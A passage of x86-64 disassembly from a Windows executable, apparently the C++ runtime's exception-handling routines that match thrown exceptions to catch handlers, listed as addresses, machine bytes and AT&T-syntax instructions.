   140004854:	74 12                	je     0x140004868
   140004856:	8d 4a ff             	lea    -0x1(%rdx),%ecx
   140004859:	49 8d 04 c9          	lea    (%r9,%rcx,8),%rax
   14000485d:	42 8b 44 18 04       	mov    0x4(%rax,%r11,1),%eax
   140004862:	48 83 c4 20          	add    $0x20,%rsp
   140004866:	5b                   	pop    %rbx
   140004867:	c3                   	ret
   140004868:	83 c8 ff             	or     $0xffffffff,%eax
   14000486b:	eb f5                	jmp    0x140004862
   14000486d:	e8 7e 2a 00 00       	call   0x1400072f0
   140004872:	cc                   	int3
   140004873:	cc                   	int3
   140004874:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140004879:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   14000487e:	48 89 7c 24 18       	mov    %rdi,0x18(%rsp)
   140004883:	41 55                	push   %r13
   140004885:	41 56                	push   %r14
   140004887:	41 57                	push   %r15
   140004889:	48 83 ec 30          	sub    $0x30,%rsp
   14000488d:	4d 8b f1             	mov    %r9,%r14
   140004890:	49 8b d8             	mov    %r8,%rbx
   140004893:	48 8b f2             	mov    %rdx,%rsi
   140004896:	4c 8b e9             	mov    %rcx,%r13
   140004899:	4d 63 78 04          	movslq 0x4(%r8),%r15
   14000489d:	33 ff                	xor    %edi,%edi
   14000489f:	45 85 ff             	test   %r15d,%r15d
   1400048a2:	74 0b                	je     0x1400048af
   1400048a4:	e8 eb fd ff ff       	call   0x140004694
   1400048a9:	49 8d 14 07          	lea    (%r15,%rax,1),%rdx
   1400048ad:	eb 03                	jmp    0x1400048b2
   1400048af:	48 8b d7             	mov    %rdi,%rdx
   1400048b2:	48 85 d2             	test   %rdx,%rdx
   1400048b5:	0f 84 6f 01 00 00    	je     0x140004a2a
   1400048bb:	4c 63 7b 04          	movslq 0x4(%rbx),%r15
   1400048bf:	45 85 ff             	test   %r15d,%r15d
   1400048c2:	74 0b                	je     0x1400048cf
   1400048c4:	e8 cb fd ff ff       	call   0x140004694
   1400048c9:	49 8d 0c 07          	lea    (%r15,%rax,1),%rcx
   1400048cd:	eb 03                	jmp    0x1400048d2
   1400048cf:	48 8b cf             	mov    %rdi,%rcx
   1400048d2:	40 38 79 10          	cmp    %dil,0x10(%rcx)
   1400048d6:	0f 84 4e 01 00 00    	je     0x140004a2a
   1400048dc:	39 7b 08             	cmp    %edi,0x8(%rbx)
   1400048df:	75 08                	jne    0x1400048e9
   1400048e1:	39 3b                	cmp    %edi,(%rbx)
   1400048e3:	0f 8d 41 01 00 00    	jge    0x140004a2a
   1400048e9:	39 3b                	cmp    %edi,(%rbx)
   1400048eb:	7c 0a                	jl     0x1400048f7
   1400048ed:	48 63 43 08          	movslq 0x8(%rbx),%rax
   1400048f1:	48 03 06             	add    (%rsi),%rax
   1400048f4:	48 8b f0             	mov    %rax,%rsi
   1400048f7:	f6 03 80             	testb  $0x80,(%rbx)
   1400048fa:	74 32                	je     0x14000492e
   1400048fc:	41 f6 06 10          	testb  $0x10,(%r14)
   140004900:	74 2c                	je     0x14000492e
   140004902:	48 8b 05 47 a3 01 00 	mov    0x1a347(%rip),%rax        # 0x14001ec50
   140004909:	48 85 c0             	test   %rax,%rax
   14000490c:	74 20                	je     0x14000492e
   14000490e:	ff 15 7c b9 00 00    	call   *0xb97c(%rip)        # 0x140010290
   140004914:	48 85 c0             	test   %rax,%rax
   140004917:	0f 84 29 01 00 00    	je     0x140004a46
   14000491d:	48 85 f6             	test   %rsi,%rsi
   140004920:	0f 84 20 01 00 00    	je     0x140004a46
   140004926:	48 89 06             	mov    %rax,(%rsi)
   140004929:	48 8b c8             	mov    %rax,%rcx
   14000492c:	eb 5f                	jmp    0x14000498d
   14000492e:	f6 03 08             	testb  $0x8,(%rbx)
   140004931:	74 1b                	je     0x14000494e
   140004933:	49 8b 4d 28          	mov    0x28(%r13),%rcx
   140004937:	48 85 c9             	test   %rcx,%rcx
   14000493a:	0f 84 0b 01 00 00    	je     0x140004a4b
   140004940:	48 85 f6             	test   %rsi,%rsi
   140004943:	0f 84 02 01 00 00    	je     0x140004a4b
   140004949:	48 89 0e             	mov    %rcx,(%rsi)
   14000494c:	eb 3f                	jmp    0x14000498d
   14000494e:	41 f6 06 01          	testb  $0x1,(%r14)
   140004952:	74 4a                	je     0x14000499e
   140004954:	49 8b 55 28          	mov    0x28(%r13),%rdx
   140004958:	48 85 d2             	test   %rdx,%rdx
   14000495b:	0f 84 ef 00 00 00    	je     0x140004a50
   140004961:	48 85 f6             	test   %rsi,%rsi
   140004964:	0f 84 e6 00 00 00    	je     0x140004a50
   14000496a:	4d 63 46 14          	movslq 0x14(%r14),%r8
   14000496e:	48 8b ce             	mov    %rsi,%rcx
   140004971:	e8 da a0 00 00       	call   0x14000ea50
   140004976:	41 83 7e 14 08       	cmpl   $0x8,0x14(%r14)
   14000497b:	0f 85 a5 00 00 00    	jne    0x140004a26
   140004981:	48 39 3e             	cmp    %rdi,(%rsi)
   140004984:	0f 84 9c 00 00 00    	je     0x140004a26
   14000498a:	48 8b 0e             	mov    (%rsi),%rcx
   14000498d:	49 8d 56 08          	lea    0x8(%r14),%rdx
   140004991:	e8 c2 f4 ff ff       	call   0x140003e58
   140004996:	48 89 06             	mov    %rax,(%rsi)
   140004999:	e9 88 00 00 00       	jmp    0x140004a26
   14000499e:	49 63 5e 18          	movslq 0x18(%r14),%rbx
   1400049a2:	85 db                	test   %ebx,%ebx
   1400049a4:	74 0b                	je     0x1400049b1
   1400049a6:	e8 fd fc ff ff       	call   0x1400046a8
   1400049ab:	48 8d 0c 03          	lea    (%rbx,%rax,1),%rcx
   1400049af:	eb 03                	jmp    0x1400049b4
   1400049b1:	48 8b cf             	mov    %rdi,%rcx
   1400049b4:	48 85 c9             	test   %rcx,%rcx
   1400049b7:	75 34                	jne    0x1400049ed
   1400049b9:	49 39 7d 28          	cmp    %rdi,0x28(%r13)
   1400049bd:	0f 84 92 00 00 00    	je     0x140004a55
   1400049c3:	48 85 f6             	test   %rsi,%rsi
   1400049c6:	0f 84 89 00 00 00    	je     0x140004a55
   1400049cc:	49 63 5e 14          	movslq 0x14(%r14),%rbx
   1400049d0:	49 8d 56 08          	lea    0x8(%r14),%rdx
   1400049d4:	49 8b 4d 28          	mov    0x28(%r13),%rcx
   1400049d8:	e8 7b f4 ff ff       	call   0x140003e58
   1400049dd:	48 8b d0             	mov    %rax,%rdx
   1400049e0:	4c 8b c3             	mov    %rbx,%r8
   1400049e3:	48 8b ce             	mov    %rsi,%rcx
   1400049e6:	e8 65 a0 00 00       	call   0x14000ea50
   1400049eb:	eb 39                	jmp    0x140004a26
   1400049ed:	49 39 7d 28          	cmp    %rdi,0x28(%r13)
   1400049f1:	74 67                	je     0x140004a5a
   1400049f3:	48 85 f6             	test   %rsi,%rsi
   1400049f6:	74 62                	je     0x140004a5a
   1400049f8:	49 63 5e 18          	movslq 0x18(%r14),%rbx
   1400049fc:	85 db                	test   %ebx,%ebx
   1400049fe:	74 0b                	je     0x140004a0b
   140004a00:	e8 a3 fc ff ff       	call   0x1400046a8
   140004a05:	48 8d 0c 03          	lea    (%rbx,%rax,1),%rcx
   140004a09:	eb 03                	jmp    0x140004a0e
   140004a0b:	48 8b cf             	mov    %rdi,%rcx
   140004a0e:	48 85 c9             	test   %rcx,%rcx
   140004a11:	74 47                	je     0x140004a5a
   140004a13:	41 8a 06             	mov    (%r14),%al
   140004a16:	24 04                	and    $0x4,%al
   140004a18:	f6 d8                	neg    %al
   140004a1a:	1b c9                	sbb    %ecx,%ecx
   140004a1c:	f7 d9                	neg    %ecx
   140004a1e:	ff c1                	inc    %ecx
   140004a20:	8b f9                	mov    %ecx,%edi
   140004a22:	89 4c 24 20          	mov    %ecx,0x20(%rsp)
   140004a26:	8b c7                	mov    %edi,%eax
   140004a28:	eb 02                	jmp    0x140004a2c
   140004a2a:	33 c0                	xor    %eax,%eax
   140004a2c:	48 8b 5c 24 50       	mov    0x50(%rsp),%rbx
   140004a31:	48 8b 74 24 58       	mov    0x58(%rsp),%rsi
   140004a36:	48 8b 7c 24 60       	mov    0x60(%rsp),%rdi
   140004a3b:	48 83 c4 30          	add    $0x30,%rsp
   140004a3f:	41 5f                	pop    %r15
   140004a41:	41 5e                	pop    %r14
   140004a43:	41 5d                	pop    %r13
   140004a45:	c3                   	ret
   140004a46:	e8 a5 28 00 00       	call   0x1400072f0
   140004a4b:	e8 a0 28 00 00       	call   0x1400072f0
   140004a50:	e8 9b 28 00 00       	call   0x1400072f0
   140004a55:	e8 96 28 00 00       	call   0x1400072f0
   140004a5a:	e8 91 28 00 00       	call   0x1400072f0
   140004a5f:	90                   	nop
   140004a60:	e8 8b 28 00 00       	call   0x1400072f0
   140004a65:	90                   	nop
   140004a66:	cc                   	int3
   140004a67:	cc                   	int3
   140004a68:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140004a6d:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   140004a72:	48 89 7c 24 18       	mov    %rdi,0x18(%rsp)
   140004a77:	41 56                	push   %r14
   140004a79:	48 83 ec 20          	sub    $0x20,%rsp
   140004a7d:	49 8b f1             	mov    %r9,%rsi
   140004a80:	4c 8b f1             	mov    %rcx,%r14
   140004a83:	33 db                	xor    %ebx,%ebx
   140004a85:	41 39 18             	cmp    %ebx,(%r8)
   140004a88:	7d 05                	jge    0x140004a8f
   140004a8a:	48 8b fa             	mov    %rdx,%rdi
   140004a8d:	eb 07                	jmp    0x140004a96
   140004a8f:	49 63 78 08          	movslq 0x8(%r8),%rdi
   140004a93:	48 03 3a             	add    (%rdx),%rdi
   140004a96:	e8 d9 fd ff ff       	call   0x140004874
   140004a9b:	83 e8 01             	sub    $0x1,%eax
   140004a9e:	74 3c                	je     0x140004adc
   140004aa0:	83 f8 01             	cmp    $0x1,%eax
   140004aa3:	75 67                	jne    0x140004b0c
   140004aa5:	48 8d 56 08          	lea    0x8(%rsi),%rdx
   140004aa9:	49 8b 4e 28          	mov    0x28(%r14),%rcx
   140004aad:	e8 a6 f3 ff ff       	call   0x140003e58
   140004ab2:	4c 8b f0             	mov    %rax,%r14
   140004ab5:	48 63 76 18          	movslq 0x18(%rsi),%rsi
   140004ab9:	85 f6                	test   %esi,%esi
   140004abb:	74 09                	je     0x140004ac6
   140004abd:	e8 e6 fb ff ff       	call   0x1400046a8
   140004ac2:	48 8d 1c 30          	lea    (%rax,%rsi,1),%rbx
   140004ac6:	41 b9 01 00 00 00    	mov    $0x1,%r9d
   140004acc:	4d 8b c6             	mov    %r14,%r8
   140004acf:	48 8b d3             	mov    %rbx,%rdx
   140004ad2:	48 8b cf             	mov    %rdi,%rcx
   140004ad5:	e8 be 12 00 00       	call   0x140005d98
   140004ada:	eb 30                	jmp    0x140004b0c
   140004adc:	48 8d 56 08          	lea    0x8(%rsi),%rdx
   140004ae0:	49 8b 4e 28          	mov    0x28(%r14),%rcx
   140004ae4:	e8 6f f3 ff ff       	call   0x140003e58
   140004ae9:	4c 8b f0             	mov    %rax,%r14
   140004aec:	48 63 76 18          	movslq 0x18(%rsi),%rsi
   140004af0:	85 f6                	test   %esi,%esi
   140004af2:	74 09                	je     0x140004afd
   140004af4:	e8 af fb ff ff       	call   0x1400046a8
   140004af9:	48 8d 1c 30          	lea    (%rax,%rsi,1),%rbx
   140004afd:	4d 8b c6             	mov    %r14,%r8
   140004b00:	48 8b d3             	mov    %rbx,%rdx
   140004b03:	48 8b cf             	mov    %rdi,%rcx
   140004b06:	e8 81 12 00 00       	call   0x140005d8c
   140004b0b:	90                   	nop
   140004b0c:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140004b11:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   140004b16:	48 8b 7c 24 40       	mov    0x40(%rsp),%rdi
   140004b1b:	48 83 c4 20          	add    $0x20,%rsp
   140004b1f:	41 5e                	pop    %r14
   140004b21:	c3                   	ret
   140004b22:	e8 c9 27 00 00       	call   0x1400072f0
   140004b27:	90                   	nop
   140004b28:	48 8b c4             	mov    %rsp,%rax
   140004b2b:	48 89 58 08          	mov    %rbx,0x8(%rax)
   140004b2f:	4c 89 40 18          	mov    %r8,0x18(%rax)
   140004b33:	55                   	push   %rbp
   140004b34:	56                   	push   %rsi
   140004b35:	57                   	push   %rdi
   140004b36:	41 54                	push   %r12
   140004b38:	41 55                	push   %r13
   140004b3a:	41 56                	push   %r14
   140004b3c:	41 57                	push   %r15
   140004b3e:	48 83 ec 60          	sub    $0x60,%rsp
   140004b42:	4c 8b 84 24 c0 00 00 	mov    0xc0(%rsp),%r8
   140004b49:	00 
   140004b4a:	4d 8b e1             	mov    %r9,%r12
   140004b4d:	4c 8b ea             	mov    %rdx,%r13
   140004b50:	4c 8d 48 10          	lea    0x10(%rax),%r9
   140004b54:	4c 8b f1             	mov    %rcx,%r14
   140004b57:	49 8b d4             	mov    %r12,%rdx
   140004b5a:	49 8b cd             	mov    %r13,%rcx
   140004b5d:	e8 82 f7 ff ff       	call   0x1400042e4
   140004b62:	4c 8b 8c 24 d0 00 00 	mov    0xd0(%rsp),%r9
   140004b69:	00 
   140004b6a:	4c 8b f8             	mov    %rax,%r15
   140004b6d:	48 8b ac 24 c8 00 00 	mov    0xc8(%rsp),%rbp
   140004b74:	00 
   140004b75:	4d 85 c9             	test   %r9,%r9
   140004b78:	74 0e                	je     0x140004b88
   140004b7a:	4c 8b c5             	mov    %rbp,%r8
   140004b7d:	48 8b d0             	mov    %rax,%rdx
   140004b80:	49 8b ce             	mov    %r14,%rcx
   140004b83:	e8 e0 fe ff ff       	call   0x140004a68
   140004b88:	48 8b 8c 24 d8 00 00 	mov    0xd8(%rsp),%rcx
   140004b8f:	00 
   140004b90:	48 63 5d 0c          	movslq 0xc(%rbp),%rbx
   140004b94:	8b 79 08             	mov    0x8(%rcx),%edi
   140004b97:	8b 31                	mov    (%rcx),%esi
   140004b99:	e8 f6 fa ff ff       	call   0x140004694
   140004b9e:	8a 8c 24 f8 00 00 00 	mov    0xf8(%rsp),%cl
   140004ba5:	48 03 c3             	add    %rbx,%rax
   140004ba8:	4c 8b 84 24 b0 00 00 	mov    0xb0(%rsp),%r8
   140004baf:	00 
   140004bb0:	4d 8b cf             	mov    %r15,%r9
   140004bb3:	88 4c 24 50          	mov    %cl,0x50(%rsp)
   140004bb7:	49 8b d6             	mov    %r14,%rdx
   140004bba:	48 8b 8c 24 c0 00 00 	mov    0xc0(%rsp),%rcx
   140004bc1:	00 
   140004bc2:	4c 89 64 24 48       	mov    %r12,0x48(%rsp)
   140004bc7:	48 89 6c 24 40       	mov    %rbp,0x40(%rsp)
   140004bcc:	89 7c 24 38          	mov    %edi,0x38(%rsp)
   140004bd0:	89 74 24 30          	mov    %esi,0x30(%rsp)
   140004bd4:	48 89 4c 24 28       	mov    %rcx,0x28(%rsp)
   140004bd9:	49 8b cd             	mov    %r13,%rcx
   140004bdc:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140004be1:	e8 1a f9 ff ff       	call   0x140004500
   140004be6:	48 8b 9c 24 a0 00 00 	mov    0xa0(%rsp),%rbx
   140004bed:	00 
   140004bee:	48 83 c4 60          	add    $0x60,%rsp
   140004bf2:	41 5f                	pop    %r15
   140004bf4:	41 5e                	pop    %r14
   140004bf6:	41 5d                	pop    %r13
   140004bf8:	41 5c                	pop    %r12
   140004bfa:	5f                   	pop    %rdi
   140004bfb:	5e                   	pop    %rsi
   140004bfc:	5d                   	pop    %rbp
   140004bfd:	c3                   	ret
   140004bfe:	cc                   	int3
   140004bff:	cc                   	int3
   140004c00:	40 55                	rex push %rbp
   140004c02:	53                   	push   %rbx
   140004c03:	56                   	push   %rsi
   140004c04:	57                   	push   %rdi
   140004c05:	41 54                	push   %r12
   140004c07:	41 55                	push   %r13
   140004c09:	41 56                	push   %r14
   140004c0b:	41 57                	push   %r15
   140004c0d:	48 8d 6c 24 e8       	lea    -0x18(%rsp),%rbp
   140004c12:	48 81 ec 18 01 00 00 	sub    $0x118,%rsp
   140004c19:	48 8b 05 e0 93 01 00 	mov    0x193e0(%rip),%rax        # 0x14001e000
   140004c20:	48 33 c4             	xor    %rsp,%rax
   140004c23:	48 89 45 08          	mov    %rax,0x8(%rbp)
   140004c27:	48 8b b5 80 00 00 00 	mov    0x80(%rbp),%rsi
   140004c2e:	4c 8b e2             	mov    %rdx,%r12
   140004c31:	48 8b 9d 98 00 00 00 	mov    0x98(%rbp),%rbx
   140004c38:	4d 8b e8             	mov    %r8,%r13
   140004c3b:	48 89 55 80          	mov    %rdx,-0x80(%rbp)
   140004c3f:	48 8b f9             	mov    %rcx,%rdi
   140004c42:	4c 8b c6             	mov    %rsi,%r8
   140004c45:	48 89 5c 24 78       	mov    %rbx,0x78(%rsp)
   140004c4a:	49 8b cc             	mov    %r12,%rcx
   140004c4d:	49 8b d1             	mov    %r9,%rdx
   140004c50:	4d 8b f1             	mov    %r9,%r14
   140004c53:	e8 2c 0f 00 00       	call   0x140005b84
   140004c58:	44 8b f8             	mov    %eax,%r15d
   140004c5b:	83 f8 ff             	cmp    $0xffffffff,%eax
   140004c5e:	0f 8c 53 04 00 00    	jl     0x1400050b7
   140004c64:	3b 46 04             	cmp    0x4(%rsi),%eax
   140004c67:	0f 8d 4a 04 00 00    	jge    0x1400050b7
   140004c6d:	81 3f 63 73 6d e0    	cmpl   $0xe06d7363,(%rdi)
   140004c73:	c6 44 24 60 00       	movb   $0x0,0x60(%rsp)
   140004c78:	0f 85 d0 00 00 00    	jne    0x140004d4e
   140004c7e:	83 7f 18 04          	cmpl   $0x4,0x18(%rdi)
   140004c82:	0f 85 c6 00 00 00    	jne    0x140004d4e
   140004c88:	8b 47 20             	mov    0x20(%rdi),%eax
   140004c8b:	2d 20 05 93 19       	sub    $0x19930520,%eax
   140004c90:	83 f8 02             	cmp    $0x2,%eax
   140004c93:	0f 87 b5 00 00 00    	ja     0x140004d4e
   140004c99:	48 83 7f 30 00       	cmpq   $0x0,0x30(%rdi)
   140004c9e:	0f 85 aa 00 00 00    	jne    0x140004d4e
   140004ca4:	e8 33 f3 ff ff       	call   0x140003fdc
   140004ca9:	48 83 78 20 00       	cmpq   $0x0,0x20(%rax)
   140004cae:	0f 84 a1 03 00 00    	je     0x140005055
   140004cb4:	e8 23 f3 ff ff       	call   0x140003fdc
   140004cb9:	48 8b 78 20          	mov    0x20(%rax),%rdi
   140004cbd:	e8 1a f3 ff ff       	call   0x140003fdc
   140004cc2:	48 8b 4f 38          	mov    0x38(%rdi),%rcx
   140004cc6:	4c 8b 68 28          	mov    0x28(%rax),%r13
   140004cca:	e8 05 fa ff ff       	call   0x1400046d4
   140004ccf:	48 85 ff             	test   %rdi,%rdi
   140004cd2:	0f 84 df 03 00 00    	je     0x1400050b7
   140004cd8:	81 3f 63 73 6d e0    	cmpl   $0xe06d7363,(%rdi)
   140004cde:	75 1e                	jne    0x140004cfe
   140004ce0:	83 7f 18 04          	cmpl   $0x4,0x18(%rdi)
   140004ce4:	75 18                	jne    0x140004cfe
   140004ce6:	8b 47 20             	mov    0x20(%rdi),%eax
   140004ce9:	2d 20 05 93 19       	sub    $0x19930520,%eax
   140004cee:	83 f8 02             	cmp    $0x2,%eax
   140004cf1:	77 0b                	ja     0x140004cfe
   140004cf3:	48 83 7f 30 00       	cmpq   $0x0,0x30(%rdi)
   140004cf8:	0f 84 b9 03 00 00    	je     0x1400050b7
   140004cfe:	c6 44 24 60 01       	movb   $0x1,0x60(%rsp)
   140004d03:	e8 d4 f2 ff ff       	call   0x140003fdc
   140004d08:	48 83 78 38 00       	cmpq   $0x0,0x38(%rax)
   140004d0d:	74 3f                	je     0x140004d4e
   140004d0f:	e8 c8 f2 ff ff       	call   0x140003fdc
   140004d14:	48 8b 58 38          	mov    0x38(%rax),%rbx
   140004d18:	e8 bf f2 ff ff       	call   0x140003fdc
   140004d1d:	48 8b d3             	mov    %rbx,%rdx
   140004d20:	48 8b cf             	mov    %rdi,%rcx
   140004d23:	48 c7 40 38 00 00 00 	movq   $0x0,0x38(%rax)
   140004d2a:	00 
   140004d2b:	e8 e8 0e 00 00       	call   0x140005c18
   140004d30:	84 c0                	test   %al,%al
   140004d32:	75 15                	jne    0x140004d49
   140004d34:	48 8b cb             	mov    %rbx,%rcx
   140004d37:	e8 bc 0f 00 00       	call   0x140005cf8
   140004d3c:	84 c0                	test   %al,%al
   140004d3e:	0f 84 55 03 00 00    	je     0x140005099
   140004d44:	e9 2c 03 00 00       	jmp    0x140005075
   140004d49:	48 8b 5c 24 78       	mov    0x78(%rsp),%rbx
   140004d4e:	49 8b 46 08          	mov    0x8(%r14),%rax
   140004d52:	48 89 45 c8          	mov    %rax,-0x38(%rbp)
   140004d56:	48 89 75 c0          	mov    %rsi,-0x40(%rbp)
   140004d5a:	81 3f 63 73 6d e0    	cmpl   $0xe06d7363,(%rdi)
   140004d60:	0f 85 a6 02 00 00    	jne    0x14000500c
   140004d66:	83 7f 18 04          	cmpl   $0x4,0x18(%rdi)
   140004d6a:	0f 85 9c 02 00 00    	jne    0x14000500c
   140004d70:	8b 47 20             	mov    0x20(%rdi),%eax
   140004d73:	2d 20 05 93 19       	sub    $0x19930520,%eax
   140004d78:	83 f8 02             	cmp    $0x2,%eax
   140004d7b:	0f 87 8b 02 00 00    	ja     0x14000500c
   140004d81:	83 7e 0c 00          	cmpl   $0x0,0xc(%rsi)
   140004d85:	0f 86 bb 01 00 00    	jbe    0x140004f46
   140004d8b:	8b 85 90 00 00 00    	mov    0x90(%rbp),%eax
   140004d91:	48 8d 55 c0          	lea    -0x40(%rbp),%rdx
   140004d95:	89 44 24 28          	mov    %eax,0x28(%rsp)
   140004d99:	48 8d 4d d0          	lea    -0x30(%rbp),%rcx
   140004d9d:	4d 8b ce             	mov    %r14,%r9
   140004da0:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   140004da5:	45 8b c7             	mov    %r15d,%r8d
   140004da8:	e8 17 f6 ff ff       	call   0x1400043c4
   140004dad:	0f 10 45 d0          	movups -0x30(%rbp),%xmm0
   140004db1:	f3 0f 7f 45 90       	movdqu %xmm0,-0x70(%rbp)
   140004db6:	66 0f 73 d8 08       	psrldq $0x8,%xmm0
   140004dbb:	66 0f 7e c0          	movd   %xmm0,%eax
   140004dbf:	3b 45 e8             	cmp    -0x18(%rbp),%eax
   140004dc2:	0f 83 7e 01 00 00    	jae    0x140004f46
   140004dc8:	44 8b 65 98          	mov    -0x68(%rbp),%r12d
   140004dcc:	4c 8b 4d 90          	mov    -0x70(%rbp),%r9
   140004dd0:	49 8b 01             	mov    (%r9),%rax
   140004dd3:	48 63 50 10          	movslq 0x10(%rax),%rdx
   140004dd7:	41 8b c4             	mov    %r12d,%eax
   140004dda:	48 8d 0c 80          	lea    (%rax,%rax,4),%rcx
   140004dde:	49 8b 41 08          	mov    0x8(%r9),%rax
   140004de2:	4c 8d 04 8a          	lea    (%rdx,%rcx,4),%r8
   140004de6:	41 0f 10 04 00       	movups (%r8,%rax,1),%xmm0
   140004deb:	49 63 4c 00 10       	movslq 0x10(%r8,%rax,1),%rcx
   140004df0:	89 4d b8             	mov    %ecx,-0x48(%rbp)
   140004df3:	66 0f 7e c0          	movd   %xmm0,%eax
   140004df7:	0f 11 45 a8          	movups %xmm0,-0x58(%rbp)
   140004dfb:	41 3b c7             	cmp    %r15d,%eax
   140004dfe:	0f 8f 31 01 00 00    	jg     0x140004f35
   140004e04:	66 48 0f 7e c0       	movq   %xmm0,%rax
   140004e09:	48 c1 e8 20          	shr    $0x20,%rax
   140004e0d:	44 3b f8             	cmp    %eax,%r15d
   140004e10:	0f 8f 1f 01 00 00    	jg     0x140004f35
   140004e16:	48 8b d1             	mov    %rcx,%rdx
   140004e19:	66 0f 73 d8 08       	psrldq $0x8,%xmm0
   140004e1e:	49 03 56 08          	add    0x8(%r14),%rdx
   140004e22:	33 c0                	xor    %eax,%eax
   140004e24:	66 48 0f 7e c1       	movq   %xmm0,%rcx
   140004e29:	48 89 55 88          	mov    %rdx,-0x78(%rbp)
   140004e2d:	48 c1 e9 20          	shr    $0x20,%rcx
   140004e31:	89 44 24 68          	mov    %eax,0x68(%rsp)
   140004e35:	48 89 4d a0          	mov    %rcx,-0x60(%rbp)
   140004e39:	85 c9                	test   %ecx,%ecx
   140004e3b:	0f 84 f4 00 00 00    	je     0x140004f35
   140004e41:	48 8d 04 80          	lea    (%rax,%rax,4),%rax
   140004e45:	0f 10 04 82          	movups (%rdx,%rax,4),%xmm0
   140004e49:	0f 11 45 f0          	movups %xmm0,-0x10(%rbp)
   140004e4d:	8b 44 82 10          	mov    0x10(%rdx,%rax,4),%eax
   140004e51:	89 45 00             	mov    %eax,0x0(%rbp)
   140004e54:	48 8b 47 30          	mov    0x30(%rdi),%rax
   140004e58:	48 63 58 0c          	movslq 0xc(%rax),%rbx
   140004e5c:	e8 47 f8 ff ff       	call   0x1400046a8
   140004e61:	48 83 c0 04          	add    $0x4,%rax
   140004e65:	48 03 c3             	add    %rbx,%rax
   140004e68:	48 89 44 24 70       	mov    %rax,0x70(%rsp)
   140004e6d:	48 8b 47 30          	mov    0x30(%rdi),%rax
   140004e71:	48 63 58 0c          	movslq 0xc(%rax),%rbx
   140004e75:	e8 2e f8 ff ff       	call   0x1400046a8
   140004e7a:	8b 0c 18             	mov    (%rax,%rbx,1),%ecx
   140004e7d:	89 4c 24 64          	mov    %ecx,0x64(%rsp)
   140004e81:	85 c9                	test   %ecx,%ecx
   140004e83:	7e 40                	jle    0x140004ec5
   140004e85:	48 8b 4c 24 70       	mov    0x70(%rsp),%rcx
   140004e8a:	48 63 19             	movslq (%rcx),%rbx
   140004e8d:	e8 16 f8 ff ff       	call   0x1400046a8
   140004e92:	4c 8b 47 30          	mov    0x30(%rdi),%r8
   140004e96:	48 8d 4d f0          	lea    -0x10(%rbp),%rcx
   140004e9a:	48 03 d8             	add    %rax,%rbx
   140004e9d:	48 8b d3             	mov    %rbx,%rdx
   140004ea0:	e8 63 04 00 00       	call   0x140005308
   140004ea5:	85 c0                	test   %eax,%eax
   140004ea7:	75 34                	jne    0x140004edd
   140004ea9:	8b 44 24 64          	mov    0x64(%rsp),%eax
   140004ead:	48 8b 4c 24 70       	mov    0x70(%rsp),%rcx
   140004eb2:	ff c8                	dec    %eax
   140004eb4:	48 83 c1 04          	add    $0x4,%rcx
   140004eb8:	89 44 24 64          	mov    %eax,0x64(%rsp)
   140004ebc:	48 89 4c 24 70       	mov    %rcx,0x70(%rsp)
   140004ec1:	85 c0                	test   %eax,%eax
   140004ec3:	7f c5                	jg     0x140004e8a
   140004ec5:	8b 44 24 68          	mov    0x68(%rsp),%eax
   140004ec9:	ff c0                	inc    %eax
   140004ecb:	89 44 24 68          	mov    %eax,0x68(%rsp)
   140004ecf:	3b 45 a0             	cmp    -0x60(%rbp),%eax
   140004ed2:	74 5d                	je     0x140004f31
   140004ed4:	48 8b 55 88          	mov    -0x78(%rbp),%rdx
   140004ed8:	e9 64 ff ff ff       	jmp    0x140004e41
   140004edd:	8a 85 88 00 00 00    	mov    0x88(%rbp),%al
   140004ee3:	4d 8b ce             	mov    %r14,%r9
   140004ee6:	48 8b 55 80          	mov    -0x80(%rbp),%rdx
   140004eea:	4d 8b c5             	mov    %r13,%r8
   140004eed:	88 44 24 58          	mov    %al,0x58(%rsp)
   140004ef1:	48 8b cf             	mov    %rdi,%rcx
   140004ef4:	8a 44 24 60          	mov    0x60(%rsp),%al
   140004ef8:	88 44 24 50          	mov    %al,0x50(%rsp)
   140004efc:	48 8b 44 24 78       	mov    0x78(%rsp),%rax
   140004f01:	48 89 44 24 48       	mov    %rax,0x48(%rsp)
   140004f06:	8b 85 90 00 00 00    	mov    0x90(%rbp),%eax
   140004f0c:	89 44 24 40          	mov    %eax,0x40(%rsp)
   140004f10:	48 8d 45 a8          	lea    -0x58(%rbp),%rax
   140004f14:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
   140004f19:	48 8d 45 f0          	lea    -0x10(%rbp),%rax
   140004f1d:	48 89 5c 24 30       	mov    %rbx,0x30(%rsp)
   140004f22:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   140004f27:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   140004f2c:	e8 f7 fb ff ff       	call   0x140004b28
   140004f31:	4c 8b 4d 90          	mov    -0x70(%rbp),%r9
   140004f35:	41 ff c4             	inc    %r12d
   140004f38:	44 3b 65 e8          	cmp    -0x18(%rbp),%r12d
   140004f3c:	0f 82 8e fe ff ff    	jb     0x140004dd0
   140004f42:	4c 8b 65 80          	mov    -0x80(%rbp),%r12
   140004f46:	8b 06                	mov    (%rsi),%eax
   140004f48:	25 ff ff ff 1f       	and    $0x1fffffff,%eax
   140004f4d:	3d 21 05 93 19       	cmp    $0x19930521,%eax
   140004f52:	0f 82 f1 00 00 00    	jb     0x140005049
   140004f58:	48 63 5e 20          	movslq 0x20(%rsi),%rbx
   140004f5c:	85 db                	test   %ebx,%ebx
   140004f5e:	74 0a                	je     0x140004f6a
   140004f60:	e8 2f f7 ff ff       	call   0x140004694
   140004f65:	48 03 c3             	add    %rbx,%rax
   140004f68:	75 1d                	jne    0x140004f87
   140004f6a:	f6 46 24 04          	testb  $0x4,0x24(%rsi)
   140004f6e:	0f 84 d5 00 00 00    	je     0x140005049
   140004f74:	48 8b d6             	mov    %rsi,%rdx
   140004f77:	49 8b ce             	mov    %r14,%rcx
   140004f7a:	e8 d5 f2 ff ff       	call   0x140004254
   140004f7f:	84 c0                	test   %al,%al
   140004f81:	0f 85 c2 00 00 00    	jne    0x140005049
   140004f87:	f6 46 24 04          	testb  $0x4,0x24(%rsi)
   140004f8b:	0f 85 0e 01 00 00    	jne    0x14000509f
